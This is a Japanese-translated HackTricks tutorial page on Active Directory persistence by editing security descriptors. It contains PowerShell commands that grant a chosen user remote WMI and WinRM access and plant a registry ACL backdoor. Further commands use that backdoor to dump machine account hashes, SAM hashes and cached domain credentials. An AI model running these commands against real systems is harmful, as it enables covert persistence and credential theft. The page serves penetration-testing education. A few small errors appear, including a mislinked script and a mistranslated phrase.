# セキュリティ記述子

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには、</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をご覧ください！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングテクニックを共有する。

</details>

## セキュリティ記述子

セキュリティ記述子定義言語（SDDL）は、セキュリティ記述子を記述するために使用される形式を定義します。SDDLは、DACLとSACLのためにACE文字列を使用します: `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`

**セキュリティ記述子**は、**オブジェクト**が**他のオブジェクト**に対して持つ**権限**を**保存**するために使用されます。オブジェクトの**セキュリティ記述子**に**わずかな変更**を加えることができれば、特権グループのメンバーでなくても、そのオブジェクトに対して非常に興味深い権限を得ることができます。

したがって、この永続化テクニックは、特定のオブジェクトに対して必要なすべての権限を獲得する能力に基づいており、通常は管理者権限が必要なタスクを、管理者でなくても実行できるようにするものです。

### WMIへのアクセス

ユーザーに**リモートでWMIを実行する**アクセスを与えるには、[**これを使用します**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1):
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
```
### WinRMへのアクセス

**winrm PSコンソールへのユーザーアクセスを許可する**[**方法はこちら**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### ハッシュへのリモートアクセス

**レジストリ**にアクセスし、[**DAMP**](https://github.com/HarmJ0y/DAMP)を使用して**レジ回路バックドアを作成し、**ハッシュを**ダンプ**します。これにより、いつでも**コンピュータのハッシュ**、**SAM**、およびコンピュータにキャッシュされた**AD**の資格情報を取得できます。したがって、この権限を**ドメインコントローラコンピュータに対する通常のユーザー**に与えることは非常に有用です：
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
ドメインコントローラーのコンピューターアカウントのハッシュを使用する方法については、[**Silver Tickets**](silver-ticket.md)を確認してください。

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェックしてください！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式のPEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手してください。
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックしてください。
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加するか**、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローしてください。**
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有してください。**

</details>
